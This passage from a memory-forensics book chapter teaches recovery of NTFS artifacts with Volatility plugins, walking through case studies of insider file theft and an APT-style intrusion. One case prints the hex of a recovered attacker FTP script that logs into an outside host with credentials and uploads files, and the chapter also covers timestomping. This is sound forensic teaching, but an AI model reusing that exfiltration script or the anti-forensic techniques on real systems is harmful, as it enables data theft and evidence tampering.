# Chapter 16  
 Disk Artifacts in Memory

This chapter focuses on file system artifacts from the Windows New Technology File System (NTFS). You can find various file system artifacts in memory because the operating system and users constantly open, read, write, and delete files. These actions leave traces in memory—some of which last longer than others, because Windows is specifically designed to cache content for performance reasons. As a result, you can often perform an unexpectedly high degree of disk forensics by just looking in memory. This is critical because time-sensitive investigations may allow for acquisition of a 4GB memory sample, but not a 250GB disk image. Likewise, even if you have access to a suspect system’s disk, artifacts from file-system-related actions are replicated in RAM, so you can leverage them as a strong source of corroborating evidence.

In this chapter, you will learn how to extract various types of file system artifacts from memory dumps. In particular, you’ll examine cases that utilize memory forensics to prove an unauthorized user copied and then deleted sensitive company documents. In other examples, you’ll see how finding Master File Table (MFT) records can help you investigate malicious code that hides in alternate data streams (ADS), and how it has aided us in tracking a targeted attacker’s actions once they gained access to a victim system. Near the end of the chapter, you’ll explore internals of the Windows Cache Manager, which teaches you how to recover executables, documents, and pictures straight out of memory. Lastly, we show how memory forensics can help you defeat full disk encryption by recovering cached passwords and master encryption keys.

## Master File Table

In NTFS, everything is stored as a file. This includes special metadata files used for organizing and tracking other files. For example, the MFT is a special file located at the root of the file system (`\$Mft`), which stores critical information about all other files on the partition. As you’re about to see, because Windows reads the MFT, you can find all or part of the file in memory at any given time. Thus by locating and carving out this one file’s content, you can quickly enumerate a majority of the file system’s metadata.

The MFT contains one entry for every file and directory on the file system. Each entry, which has a maximum size of 1024 bytes, contains information such as the name, type (hidden, regular file, directory), and the locations on the disk where its data can be found. Each entry’s attributes also include timestamps that indicate when the associated file was created, modified, and accessed. Most attributes of interest are *resident,* or contained within the 1024-byte MFT entry. However, because the size of the entry is limited, some attributes, such as the `$DATA` attribute (which is used to store the file’s contents), are often *non-resident* and therefore found outside of the MFT entry.

---

**NOTE**

You can find the size of MFT entries for a system in a special NTFS file named `$Boot`. MFT entries normally have a maximum size of 1024 bytes, but they can actually be as large as 4096 bytes on Advanced Format drives (see [http://www.hexacorn.com/blog/2012/05/04/sector-size-and-mft-file-record-size](http://www.hexacorn.com/blog/2012/05/04/sector-size-and-mft-file-record-size)). This extra space can increase your potential to find residual data in slack space of the MFT entries.

---

---

## **Analysis Objectives**

Your objectives are these:

- **Find and parse MFT entries**: Learn how to properly locate and parse MFT entries to recover full file paths and their associated timestamps (created, modified, accessed, and so on).
- **Investigate removable media**: You can find MFT entries in memory that describe files accessed from removable media, including TrueCrypt volumes.
- **Recover Alternate Data Streams**: Recover data that malware hides in ADS, such as configuration files and executables.
- **Recover attacker scripts**: Discover how to utilize the MFT to recover attacker scripts from memory. For example, batch scripts used to automate repetitive tasks are often small enough to fit inside an MFT entry; thus, you can easily extract them from memory.
- **Reconstruct events**: Utilize the MFT to reconstruct attacker activities, such as exploit staging and reconnaissance. For example, you can determine when a set of tools was downloaded to a victim system. You can find traces of sensitive files being gathered in a directory and compressed—a common precursor to exfiltration.
- **Prove code execution**: By analyzing Prefetch files, you can also determine if and when certain programs executed on the system.
- **Track user activity**: You can discover if users accessed certain files (by looking for LNK shortcuts) and if they tried to cover their tracks by moving files into the Recycle bin.

---

### The MFTParser Plugin

The `mftparser` plugin extracts MFT entries from memory samples by scanning the physical address space for `FILE` and `BAAD` signatures. After entries are found, the plugin parses the attributes, builds the file path for the file, and outputs the pertinent information. The attributes that the `mftparser` plugin currently supports include:

- The `$FILE_NAME` (`$FN`) attribute
- The `$STANDARD_INFORMATION` (`$SI`) attribute
- The `$DATA` attribute

The `$DATA` attribute contains the file contents for resident files. It’s also possible for an MFT entry to have multiple `$DATA` attributes, as in the case of ADS—which are described later in the chapter.

---

**NOTE**

If you need a refresher on concepts and data structures related to disk forensics, see *File System Forensic Analysis* by Brian Carrier: [http://www.digital-evidence.org/fsfa](http://www.digital-evidence.org/fsfa).

---

[Figure 16-1](#figure16-1) shows a simplified example of an MFT entry. Although other types of attributes usually occur in the entry, this diagram shows you only the attributes most relevant to the discussions in this chapter. One thing to note is that the MFT entry may not actually use up its entire allotted space, leaving unused “slack” space at the end, as shown in the figure.

If a file’s data is 700 bytes or less, its entire contents will be resident in the `$DATA` attribute of the MFT entry, making it recoverable using this plugin. Conversely, you can’t use the `mftparser` plugin to recover the content of non-resident files; however, it may be possible to extract the file using the `dumpfiles` plugin, as discussed later in this chapter.

![c16f001.eps](/api/v2/epubs/urn:orm:book:9781118824993/files/image_fi/825099c16/c16f001.png)

*[**Figure 16-1:**](#figureanchor16-1) Example MFT Entry*

---

**NOTE**

It is possible to recover `$DATA` “residue” for a previously resident file. For example, a file can start small and later grow to exceed the maximum size of the `$DATA` attribute, thus making the file non-resident (see [http://traceevidence.blogspot.com/2013/03/a-quick-look-at-mft-resident-data-on.html](http://traceevidence.blogspot.com/2013/03/a-quick-look-at-mft-resident-data-on.html)). When this happens, the original contents of the file remain accessible in the MFT, despite being only a partial, outdated copy (especially on drives using 4096-byte MFT entries).

---

The `mftparser` plugin has two output modes: the default “verbose” mode and a “body” mode, which outputs in bodyfile format for compatibility with the Sleuthkit’s `mactime` utility (see [http://wiki.sleuthkit.org/index.php?title=Body_file](http://wiki.sleuthkit.org/index.php?title=Body_file)). The verbose mode output includes the MFT entry’s path, file type, timestamps, record number, and resident data (if any).

The following example shows an MFT entry for a log file that a key logger created. In the output, you can see the physical offset of the MFT entry (`0x2a41600`), that its record number is 22052, and it’s for a file (not a directory). Also, you can see the timestamps found in the `$SI` and `$FN` attributes as well as the file’s path on disk and its resident `$DATA`:

```
$ python vol.py –f Win7SP1x64.dmp --profile=Win7SP1x64 mftparser 
      --output-file=mftverbose.txt 
Volatility Foundation Volatility Framework 2.4
[snip]
*******************************************************
MFT entry found at offset 0x2a416000
Attribute: In Use & File 
Record Number: 22052
Link count: 1
$STANDARD_INFORMATION
Creation:    2013-03-10 23:24:45 UTC+0000 
Modified:    2013-03-10 23:28:49 UTC+0000   
MFT Altered: 2013-03-10 23:28:49 UTC+0000    
Access:      2013-03-10 23:24:45 UTC+0000    
Type: Archive
$FILE_NAME
Creation:    2013-03-10 23:24:45 UTC+0000 
Modified:    2013-03-10 23:24:45 UTC+0000   
MFT Altered: 2013-03-10 23:24:45 UTC+0000   
Access:      2013-03-10 23:24:45 UTC+0000   
Name/Path:   Users\Andrew\Desktop\log.txt
$DATA
0000000000: 3c3f786d6c2076657273696f6e3d2231  <?xml.version="1
0000000010: 2e30223f3e0a3c656e7472793e3c7469  .0"?>.<entry><ti
0000000020: 6d653e332f31302f3230313320363a32  me>3/10/2013.6:2
0000000030: 353a333520504d3c2f74696d653e3c6b  5:35.PM</time><k
0000000040: 6579733e623352714f446c7664476f34  eys>b3RqODlvdGo4
0000000050: 4f54466f63334d756148527949436858  OTFoc3MuaHRyIChX
0000000060: 616e6c3664334d70494368485a6e4e77  anl6d3MpIChHZnNw
0000000070: 4948527249455a79616e647561475967  IHRrIEZyanduaGYg
0000000080: 664342556333467563326f6752325a7a  fCBUc3Fuc2ogR2Zz
0000000090: 6347357a624342384946687562484d67  cG5zbCB8IFhubHMg
00000000a0: 546e4d67664342556333467563326f67  TnMgfCBUc3Fuc2og
00000000b0: 546b6b674c53424362696b3d3c2f6b65  TkkgLSBCbik=</ke
00000000c0: 79733e3c2f656e7472793e0d0a3c656e  ys></entry>..<en
00000000d0: 7472793e3c74696d653e332f31302f32  try><time>3/10/2
00000000e0: 30313320363a32383a343920504d3c2f  013.6:28:49.PM</
00000000f0: 74696d653e3c6b6579733e5a33526e4d  time><keys>Z3RnM
0000000100: 54497a5a33526e4d585530654867794d  TIzZ3RnMXU0eHgyM
0000000110: 48647064327070615735354c6d683063  Hdpd2ppaW55Lmh0c
0000000120: 6938766479397a616e6c34616d67674b  i8vdy9zanl4amggK
0000000130: 4664716558703363796b674b464a6d63  FdqeXp3cykgKFJmc
0000000140: 325a73616942485a6e4e77626e4c73e049  2ZsaiBHZnNwbnNsI
0000000150: 4359675557707a6157357a6243424761  CYgUWpzaW5zbCBGa
0000000160: 476830656e4c35e65442384945686d64  Gh0enN5eCB8IEhmd
0000000170: 5735355a6e456756484e714946527a63  W55ZnEgVHNqIFRzc
0000000180: 57357a616942485a6e4e774b513d3d3c  W5zaiBHZnNwKQ==<
0000000190: 2f6b6579733e3c2f656e7472793e0d0a  /keys></entry>..

********************************************************
```

You can also extract the `$DATA` as a raw file, which is useful when dealing with binary content. The `mftparser` plugin accepts the option `–D/--dump-dir` that causes it to dump all resident files to disk. Dumped files are named using the following convention:

```
 file.[MFT entry offset].data[number of data stream].dmp
```

Because there can be multiple `$DATA` attributes, the file naming convention includes a counter, which starts at zero and increases for each `$DATA` section. The following command illustrates using `mftparser` to extract all MFT-resident files. You can see a file with two data streams has been extracted as well (in bold):

```
$ python vol.py –f Win7SP1x64.dmp --profile=Win7SP1x64 mftparser 
          --output-file=mftverbose.txt 
          –D mftoutput
Scanning for MFT entries and building directory, this can take a while

$ file mftoutput/* 
mftoutput/file.0x100c7000.data0.dmp: GIF image data, version 89a, 16 x 16
mftoutput/file.0x100c7c00.data0.dmp: GIF image data, version 89a, 12 x 12
mftoutput/file.0x1029f000.data0.dmp: data
mftoutput/file.0x10725800.data0.dmp: GIF image data, version 89a, 23 x 23
mftoutput/file.0x10ac14f000.data0.dmp: ASCII text, with CRLF line terminators
mftoutput/file.0x10cc60f000.data0.dmp: HTML document, ASCII text, 
    with no line terminators
mftoutput/file.0x14b43000.data0.dmp: MS Windows 95 Internet shortcut text 
mftoutput/file.0x173eac00.data0.dmp: PNG image data, 10 x 10, 8-bit/color 
mftoutput/file.0x4013000.data0.dmp:  ASCII text, with no line terminators
mftoutput/file.0x4013000.data1.dmp:  ASCII text, with CRLF line terminators
[snip]  
```

### Alternate Data Streams

Among other reasons, ADS are used to associate security zones with downloaded files. However, malware authors often exploit ADS to hide files on the system because they do not typically appear in directory listings. For example, attackers can hide malicious executables in ADS. ZeroAccess leverages this technique (see [http://mnin.blogspot.com/2011/10/zeroaccess-volatility-and-kernel-timers.html](http://mnin.blogspot.com/2011/10/zeroaccess-volatility-and-kernel-timers.html)) to mask the true path on disk to one of its files.

---

**NOTE**

If you’re not familiar with ADS, see Recipe 10-1 of *Malware Analyst’s Cookbook* or the Alternate Data Streams in the NTFS article here: [https://blogs.technet.com/b/askcore/archive/2013/03/24/alternate-data-streams-in-ntfs.aspx](https://blogs.technet.com/b/askcore/archive/2013/03/24/alternate-data-streams-in-ntfs.aspx)

---

The `mftparser` plugin extracts Alternate Data Streams (ADS), if any exist. You can see in the following output that the host file name, taken from the `$FN` attribute, is `1654157019` and is in the Windows directory. The malicious executable is attached to the host file and hidden in an ADS named `613509021.exe`.

```
$ python vol.py –f Win7SP1x64.dmp --profile=Win7SP1x64 mftparser 
Volatility Foundation Volatility Framework 2.4

[snip]

MFT entry found at offset 0x1c02400
Attribute: In Use & File
Record Number: 19053
[snip]
$FILE_NAME
Creation:    2014-02-18 18:27:29 UTC+0000
Modified:    2014-02-18 18:27:29 UTC+0000   
MFT Altered: 2014-02-18 18:27:29 UTC+0000   
Access:      2014-02-18 18:27:29 UTC+0000   
Name/Path:   Windows\1654157019

$DATA
$DATA ADS Name: 613509021.exe
```

On a running system, if you listed the contents of the `Windows` directory without the help of a special tool (such as Sysinternals `streams.exe`), you would not see `613509021.exe`. Likewise, at first glance, it appears that the process is named `1654157019`:

```
$ python vol.py –f Win7SP1x64.dmp --profile=Win7SP1x64 pslist 
Volatility Foundation Volatility Framework 2.4
Name         PID    PPID   Thds    Hnds    Sess   Start  
------------ ------ ------ ------ -------- ------ ------ 
[snip]
1654157019    3596    696   1      5       0      2014-02-18 18:27:29 UTC+0000
[snip]
```

However, by looking at `dlllist`, which shows the process path from another perspective (the `PEB`), you can see the process is actually `1654157019:613509021.exe`, which is the ADS.

```
$ python vol.py –f Win7SP1x64.dmp --profile=Win7SP1x64 dlllist -p 3596
Volatility Foundation Volatility Framework 2.4
************************************************************************
1654157019 pid:   3596
Command line : 1654157019:613509021.exe
Service Pack 3
Base             Size  LoadCount Path
---------- ---------- ---------- ----
0x00400000      0x330     0xffff C:\WINDOWS\1654157019:613509021.exe
0x7c900000    0xaf000     0xffff C:\WINDOWS\system32\ntdll.dll
0x7c800000    0xc60f000     0xffff C:\WINDOWS\system32\kernel32.dll
```

---

**NOTE**

In Chapter 8, we describe several other ways to cross-reference the true process name and full path.

---

### The Case of the Illicit File Access

Some users think that simply moving a file into the Recycle Bin makes it disappear from the system. However, as you may know, this couldn’t be further from the truth. Placing a file into the Recycle Bin doesn’t remove or overwrite the file’s content (not immediately anyway). In this case, there was a user who tried to delete a file after he accessed and copied it without permission. But, he did a poor job covering his tracks. In particular, the `RecentDocs` registry key, which identifies recently accessed documents, showed he had opened a file named `Merger Update.docx`.

To investigate, we executed the following command that creates `mftparser` output in the body format and saves it to a file named `mft.body`.

```
$ python vol.py -f Win7SP1x64.vmem --profile=Win7SP1x64 mftparser 
         --output-file=mft.body 
         --output=body
Volatility Foundation Volatility Framework 2.4
Scanning for MFT entries and building directory, this can take a while
```

---

**NOTE**

For more information on the `RecentDocs` registry key (or tracking user activity with registry-related artifacts in general) see *Windows Registry Forensics* by Harlan Carvey: [http://windowsir.blogspot.com](http://windowsir.blogspot.com).

---

#### Files and Shortcuts

While examining the output from `mftparser`, we found proof that the user accessed the `Merger Update.docx` file. Specifically, we found several LNK files for a file named `Merger Update` as well as the `Merger Update.docx` file itself. This proves that not only was the file on the system, but that the user interacted with it by double-clicking it, which created the LNK file.

Because there are three lines per file in the `mftparser` output (one for each of the attributes that contain timestamps), the following `grep` statements are focusing only on the `$FN` entry that contains the long Unicode name (not the short DOS names).

```
$ grep -i "Merger Update" mft.body | grep FILE_NAME | cut -d\| -f2
[MFT FILE_NAME] Users\Andrew\AppData\Roaming\Microsoft\Windows\Recent
    \Merger Update.lnk (Offset: 0x172ece8)
[MFT FILE_NAME] Users\Andrew\AppData\Roaming\Microsoft\Windows\Recent
    \Merger Update.lnk (Offset: 0x1f1b9800)
[MFT FILE_NAME] Users\Andrew\Desktop\Merger Update.docx (Offset: 0x2a187190)
[snip]
[MFT FILE_NAME] Users\Andrew\AppData\Roaming\Microsoft\Office
    \Recent\Merger Update.LNK (Offset: 0x339156d0)
```

You can also use the Sleuthkit `mactime` utility to establish when the document was accessed. Here’s an example:

```
$ grep -i "Merger Update" mft.body | grep FILE_NAME | mactime -d 
Date,Size,Type,Mode,UID,GID,Meta,File Name
Mon Mar 11 2013 00:36:55,480,macb,---a-----------,0,0,22979,[MFT FILE_NAME]
    Users\Andrew\Desktop\Merger Update.docx (Offset: 0x2a187190)
Mon Mar 11 2013 00:37:32,432,macb,---a-----------,0,0,23050,[MFT FILE_NAME] 
    Users\Andrew\AppData\Roaming\Microsoft\Windows\Recent
    \Merger Update.lnk (Offset: 0x172ece8)
[snip]
Mon Mar 11 2013 00:37:38,432,macb,---a-------I---,0,0,23157,[MFT FILE_NAME] 
    Users\Andrew\AppData\Roaming\Microsoft\Office\Recent
    \Merger Update.LNK (Offset: 0x339156d0)
```

#### Searching in the Trash

For an alternate view of the MFT data, we ran `mftparser` again, this time in verbose mode. We found a Recycle Bin `$I` file for the deleted `Merger Update.docx`. The `$I` file contains metadata about the deleted file, such as its size, its original path on disk before being deleted, and a timestamp telling you when it was deleted. It always has a filename of `$I`, followed by several characters, and ends with the original file extension. Because the `$I` file is small (a maximum of 260 bytes), its contents are MFT-resident. Thus, you can easily recover and parse the `$I` file structure to learn more about the deleted file. Here is an example of the verbose output:

```
MFT entry found at offset 0x2a416000
Attribute: In Use & File 
Record Number: 22052
Link count: 2

$STANDARD_INFORMATION
Creation:    2013-03-11 04:39:52 UTC+0000 
Modified:    2013-03-11 04:39:52 UTC+0000   
MFT Altered: 2013-03-11 04:39:52 UTC+0000   
Access:      2013-03-11 04:39:52 UTC+0000   
Type: Archive

$FILE_NAME
Creation:    2013-03-11 04:39:52 UTC+0000 
Modified:    2013-03-11 04:39:52 UTC+0000   
MFT Altered: 2013-03-11 04:39:52 UTC+0000   
Access:      2013-03-11 04:39:52 UTC+0000   
Name/Path:   $Recycle.Bin\S-1-5-21-1133905431-3037184594-
             10822689-1000\$I2NGUYJ.docx

$DATA
0000000000: 01000000000000005842000000000000  ........XB......
0000000010: 00c3b478121ece0143003a005c005500  ...x....C.:.\.U.
0000000020: 73006500720073005c0041006e006400  s.e.r.s.\.A.n.d.
0000000030: 7200650077005c004400650073006b00  r.e.w.\.D.e.s.k.
0000000040: 74006f0070005c004d00650072006700  t.o.p.\.M.e.r.g.
0000000050: 65007200200055007000640061007400  e.r...U.p.d.a.t.
0000000060: 65002e0064006f006300780000000000  e...d.o.c.x.....
```

In the output, you can see that the `$I2NGUYJ.docx` file was created (in the Recycle Bin) at 2013-03-11 04:39:52 and that its MFT-resident data contains the original full path to `Merger Update.docx`. As previously mentioned, you can also extract the embedded timestamp for comparison. Because this is just a raw numerical value, you can use Volatility to make it human-readable.

#### Translating the Embedded Timestamp

The following example shows how to translate the timestamp embedded in `$I` files. First, enter the `volshell` plugin:

```
$ python vol.py -f Win7SP1x64.vmem --profile=Win7SP1x64 volshell
```

Next, import the `addrspace` module to access the `BufferAddressSpace`, which allows you to instantiate objects using raw data. In this case, you can see that the timestamp from the hex dump is copied from the `mftparser` output:

```
>>> import volatility.addrspace as addrspace
>>> bufferas = addrspace.BufferAddressSpace(self._config, 
                 data = "\x00\xc3\xb4\x78\x12\x1e\xce\x01")
```

Next, a `WinTimeStamp` object is instantiated from the buffer address space. This object has the appropriate code to convert the timestamp and display it as a human-readable time. Before printing the value, make sure to set the correct time zone (UTC in this case). As you can see, the result verifies that the file was deleted on 2013-03-11 04:39:52:

```
>>> itime = obj.Object("WinTimeStamp", offset = 0, vm = bufferas)
>>> itime.is_utc = True
>>> str(itime)
'2013-03-11 04:39:52 UTC+0000'
```

The very last line converts the size of the file from hex to decimal (16,984 bytes), which can be compared to the original file size:

```
>>> 0x4258
16984
```

By enumerating MFT records in memory, we were able to find evidence to suggest that the user (or someone who accessed the user’s computer) opened a sensitive file and tried to cover his tracks. Even if the user had emptied his Recycle Bin before disk forensics was performed, there’s a good chance the MFT entry for `$I2NGUYJ.docx` would have still been available in memory.

---

**NOTE**

For more information on the `$I` file format or leveraging Recycle Bin artifacts for forensics, see [http://www.forensicfocus.com/downloads/forensic-analysis-vista-recycle-bin.pdf](http://www.forensicfocus.com/downloads/forensic-analysis-vista-recycle-bin.pdf).

---

### The Case of Data Exfiltration

Jack Crook created an APT-like forensic challenge ([https://docs.google.com/uc?id=0B0e8hEJOUKb9RU1tRUsxenBxWWc&export=download](https://docs.google.com/uc?id=0B0e8hEJOUKb9RU1tRUsxenBxWWc&export=download)) that exemplifies the types of things we have seen in some of our cases. The `mftparser` plugin is quite useful, because it shows what files the attacker dropped and when they were executed.

#### Proof of Execution

When a program runs on a machine, a Prefetch file is created (or updated). Prefetch files were designed to speed up the application startup process. Therefore, a good starting point is to look for interesting Prefetch files to prove what executables ran on the system. In the following output, `mftparser` is run against the memory dump, and then the output is filtered through a few `grep` statements. Each statement is discussed in the following list (the `–i` option makes the filters case-insensitive):

- **grep –i “.pf”:** Return files with a “.pf” extension (Prefetch).
- **grep –i exe:** Of the files that were returned above, select files with “exe” in their path.
- **cut -d\| -f2:** Break the line on pipe characters (|) and print out the second field. `$ python vol.py -f grrcon.raw mftparser --profile=WinXPSP3x86 --output=body --output-file=grrcon_mft.body Volatility Foundation Volatility Framework 2.4 Scanning for MFT entries and building directory, this can take a while` You must then comb through the resulting output and see if anything looks amiss: `$ grep -i ".pf" grrcon_mft.body | \ grep -i exe | \ cut -d\| -f2 [snip] [MFT FILE_NAME] WINDOWS\Prefetch\EXPLORER.EXE-082F38A9.pf (Offset: 0x14bc6800) [MFT FILE_NAME] WINDOWS\Prefetch\SWING-MECHANICS.DOC[1].EXE-013CEA10.pf (Offset: 0x14c42000) [MFT FILE_NAME] WINDOWS\Prefetch\MDDEXE~1.PF (Offset: 0x1503dc00) [MFT STD_INFO] WINDOWS\Prefetch\MDDEXE~1.PF (Offset: 0x1503dc00) [MFT FILE_NAME] WINDOWS\Prefetch\MDD.EXE-1686AFD3.pf (Offset: 0x1503dc00) [snip]`

As you can see, one line of output, shown in bold, looks strange. The original filename, `SWING-MECHANICS.DOC[1].EXE`, indicates that it was meant to look like a Word document, but is actually an executable. Because Windows hides known file extensions by default, many users may be tricked into thinking the file is a Word document because only the `.DOC` extension is visible.

By searching for other Prefetch files, you can find evidence of executables that ran and are not normally found on clean Windows systems (as shown in bold):

```
[MFT FILE_NAME] WINDOWS\Prefetch\SVCHOSTS.EXE-06B6C8D2.pf (Offset: 0x2330d68)
[MFT FILE_NAME] WINDOWS\Prefetch\R.EXE-19834F9B.pf (Offset: 0xdc05430) 
[MFT FILE_NAME] WINDOWS\Prefetch\G.EXE-24E91AA8.pf (Offset: 0x19148000)
[MFT FILE_NAME] WINDOWS\Prefetch\P.EXE-04500029.pf (Offset: 0x1b2dd000)
[MFT FILE_NAME] WINDOWS\Prefetch\R.EXE-19834F9B.pf (Offset: 0x1eb2a400)
```

You can then use this information to find the original full paths of these files. Here’s an example:

```
$ grep -i \\\\r.exe grrcon_mft.body | grep FILE_NAME | cut -d\| -f2
[MFT FILE_NAME] WINDOWS\Prefetch\R.EXE-19834F9B.pf (Offset: 0xd6b4400)
[MFT FILE_NAME] WINDOWS\system32\systems\r.exe (Offset: 0x18229400)
```

---

**NOTE**

The hash in the name of a Prefetch file is based on the file’s path. Because the hashes are unique for every executable (except for “hosting” programs like `dllhost.exe`), you can easily determine whether a Prefetch file is associated with a particular program found on disk. Here are two helpful utilities:

- Python script: [https://raw2.github.com/gleeda/misc-scripts/master/prefetch/prefetch_hash.py](https://raw2.github.com/gleeda/misc-scripts/master/prefetch/prefetch_hash.py)
- Perl script: [http://www.hexacorn.com/blog/2012/06/13/prefetch-hash-calculator-a-hash-lookup-table-xpvistaw7w2k3w2k8](http://www.hexacorn.com/blog/2012/06/13/prefetch-hash-calculator-a-hash-lookup-table-xpvistaw7w2k3w2k8)

---

#### The Fake “systems” Directory

You now have the path, and you know that the “`systems`” folder is not found by default on Windows systems, which makes this file even more suspicious. You can then see what else is in that folder. In the following output, you also see another folder named “1” that might be used to stage “confidential” PDFs:

```
$ grep -i \\\\systems\\\\ grrcon_mft.body | grep FILE_NAME | cut -d\| -f2
[MFT FILE_NAME] WINDOWS\system32\systems\1\confidential3.pdf (Offset: 0x6927500)
[MFT FILE_NAME] WINDOWS\system32\systems\1\confidential4.pdf (Offset: 0xd6948b0)
[MFT FILE_NAME] WINDOWS\system32\systems\w.exe (Offset: 0xdc8b800)
[MFT FILE_NAME] WINDOWS\system32\systems\1\confidential5.pdf 
    (Offset: 0x10a1cc88)
[MFT FILE_NAME] WINDOWS\system32\systems\f.txt (Offset: 0x15938800)
[MFT FILE_NAME] WINDOWS\system32\systems\g.exe (Offset: 0x15938c00)
[MFT FILE_NAME] WINDOWS\system32\systems\p.exe (Offset: 0x18229000)
[MFT FILE_NAME] WINDOWS\system32\systems\r.exe (Offset: 0x18229400)
[MFT FILE_NAME] WINDOWS\system32\systems\sysmon.exe (Offset: 0x18229800)
[MFT FILE_NAME] WINDOWS\system32\systems\1 (Offset: 0x1b2dd400)
[snip]
```

#### Surveying the Network

By sorting the `mftparser` output using the `mactime` utility, you can determine that the following Prefetch files were created after `SWING-MECHANICS.DOC[1].EXE-013CEA10.pf`. This evidence indicates that the attacker was performing reconnaissance of the network after gaining access to the system.

```
[MFT FILE_NAME] WINDOWS\Prefetch\IPCONFIG.EXE-2395F30B.pf (Offset: 0x10c05800)
[MFT FILE_NAME] WINDOWS\Prefetch\NET.EXE-01A53C2F.pf (Offset: 0x13e5d800)
[MFT FILE_NAME] WINDOWS\Prefetch\PING.EXE-31216D26.pf (Offset: 0x11b0f400)
```

#### WinRAR Archive Exfiltration

Also, if you look at the sorted output, you can see evidence that the attacker may have archived the PDFs into a RAR file. Specifically, a `WinRAR` folder was created in the user’s `Application Data` directory right after `r.exe` executed. It’s well documented that WinRAR creates this folder when it runs for the first time on a system. Shortly after these artifacts appear, the `ftp.exe` application is run:

```
 [MFT FILE_NAME] WINDOWS\system32\systems\1\confidential3.pdf (Offset: 0x6927500)
[MFT FILE_NAME] WINDOWS\system32\systems\1\confidential4.pdf (Offset: 0xd6948b0)
[MFT FILE_NAME] WINDOWS\system32\systems\1\confidential5.pdf 
    (Offset: 0x10a1cc88)
[MFT FILE_NAME] WINDOWS\system32\systems\r.exe (Offset: 0x18229400)
[MFT FILE_NAME] WINDOWS\Prefetch\R.EXE-19834F9B.pf (Offset: 0x1eb2a400)
[MFT FILE_NAME] Documents and Settings\binge\Application Data\WinRAR 
    (Offset: 0xd6b4000)
[MFT FILE_NAME] WINDOWS\Prefetch\FTP.EXE-0FFFB5A3.pf (Offset: 0x1bd10000)
```

To verify whether the `r.exe` program is WinRAR, you can use the `dumpfiles` plugin (discussed later in this chapter) to extract it and then analyze it with the `strings` utility. The following output shows how to accomplish this:

```
$ python vol.py –f grrcon.raw filescan | grep -i r.exe$
Volatility Foundation Volatility Framework 2.4
[snip] 
0x00000000021be7a0      1      0 R--r-d 
    \Device\HarddiskVolume1\WINDOWS\system32\systems\r.exe
[snip]

$ mkdir output
$ python vol.py –f grrcon.raw dumpfiles -Q 0x00000000021be7a0 –D output
Volatility Foundation Volatility Framework 2.4
ImageSectionObject 0x021be7a0   None   
    \Device\HarddiskVolume1\WINDOWS\system32\systems\r.exe
DataSectionObject 0x021be7a0   None   
    \Device\HarddiskVolume1\WINDOWS\system32\systems\r.exe
```

The `dumpfiles` plugin extracts one file:

```
$ ls output/
file.None.0x82137f10.img
```

If you are using the `strings` utility on Linux, you need to make two passes, one for ASCII and one for Unicode:

```
$ strings –a file.None.0x82137f10.img > r.exe_strings
$ strings –a –el file.None.0x82137f10.img >> r.exe_strings
```

After that, you can examine the strings output. If you scroll down you’ll find a help message. This message belongs to WinRAR (see [https://discussions.apple.com/thread/4114488?tstart=0](https://discussions.apple.com/thread/4114488?tstart=0)) and it helps prove that the attackers used WinRAR to create an archive of files:

```
$ less r.exe_strings
[snip]
  o[+|-]        Set the overwrite mode
  oc            Set NTFS Compressed attribute
  ol            Save symbolic links as the link instead of the file
  or            Rename files automatically
  os            Save NTFS streams
  ow            Save or restore file owner and group
  p[password]   Set password
[snip]
  s-            Disable solid archiving
  sc<chr>[obj]  Specify the character set
  sfx[name]     Create SFX archive
  si[name]      Read data from standard input (stdin)

[snip]

ERROR: Bad archive %s
#Enter password (will not be echoed)
Enter password
Reenter password: 
[snip]
```

#### MFT-Resident Data

Because attacker scripts are often small enough to be MFT-resident, it is worthwhile to run the `mftparser` plugin in verbose mode to extract any scripts that may exist. In this case, the verbose output of the `mftparser` plugin extracts one of the attacker’s scripts (`f.txt`). This script opens a connection to `66.32.119.38` using a username of `jack` and a password of `2awes0me`, switches to the `systems` directory where all the dropped files are, and uploads any text files in that directory to the `/home/jack` directory of the remote system:

```
 [snip]
Full Path: WINDOWS\system32\systems\f.txt

$DATA
0x00000000: 6f 70 65 6e 20 36 36 2e 33 32 2e 31 31 39 2e 33   open.66.32.119.3
0x00000010: 38 0d 0a 6a 61 63 6b 0d 0a 32 61 77 65 73 30 6d   8..jack..2awes0m
0x00000020: 65 0d 0a 6c 63 64 20 63 3a 5c 57 49 4e 44 4f 57   e..lcd.c:\WINDOW
0x00000030: 53 5c 53 79 73 74 65 6d 33 32 5c 73 79 73 74 65   S\System32\syste
0x00000040: 6d 73 0d 0a 63 64 20 20 2f 68 6f 6d 65 2f 6a 61   ms..cd../home/ja
0x00000050: 63 6b 0d 0a 62 69 6e 61 72 79 0d 0a 6d 70 75 74   ck..binary..mput
0x00000060: 20 22 2a 2e 74 78 74 22 0d 0a 64 69 73 63 6f 6e   ."*.txt"..discon
0x00000070: 6e 65 63 74 0d 0a 62 79 65 0d 0a                  nect..bye..
```

In this example, you can see how much of the attackers’ actions are recoverable from examining the MFT entries alone. In Chapter 18, which covers more timeline methods in depth, you will see how combining artifacts from other sources with the MFT helps paint an even clearer picture of the attackers’ actions.

### Timestomping the MFT

Attackers can manipulate timestamps of MFT entries to cover their tracks, a technique commonly referred to as timestomping. To see what, if any, effect timestomping would have on MFT entries in memory, we performed some experiments using SetMACE (see [http://code.google.com/p/mft2csv/downloads/detail?name=SetMACE_v1006.zip&can=2&q](http://code.google.com/p/mft2csv/downloads/detail?name=SetMACE_v1006.zip&can=2&q)). SetMACE enables you to set the timestamps for the `$SI` and `$FN` attributes for any file on the system, which can impede investigators relying on timelines.

In the first experiment, the `$FN` timestamps were changed, the system ran for 5 minutes, and then we re-accessed the file. There were no changes in the MFT entry in memory when running the `mftparser` plugin. In the second experiment, we changed the `$SI` timestamps instead. The timestamps in memory changed for this MFT entry immediately. Therefore, it appears as though the `$SI` timestamps are more volatile than the `$FN` timestamps in memory. Furthermore, these experiments prove that you cannot rely on comparing timestamps from MFT entries in memory to those on disk in an effort to detect timestomping. You can still detect timestomping in several ways, however. The following list identifies a few examples:

- The timestomping program has its own MFT entry, which you can find in memory.
- The timestomping program creates a Prefetch file after it executes, which you can use to show that it ran.
- A Shimcache entry (described in Chapter 10) is created when the timestomping program runs.
- Depending on the file whose timestamps were manipulated, you could also use timestamps from event logs, Shimcache, or recent document registry keys to determine if timestomping is involved. For example, a program having a Shimcache record with a timestamp, but manipulated file system timestamps, would be evidence of tampering.

### Disadvantages of MFT Scanning

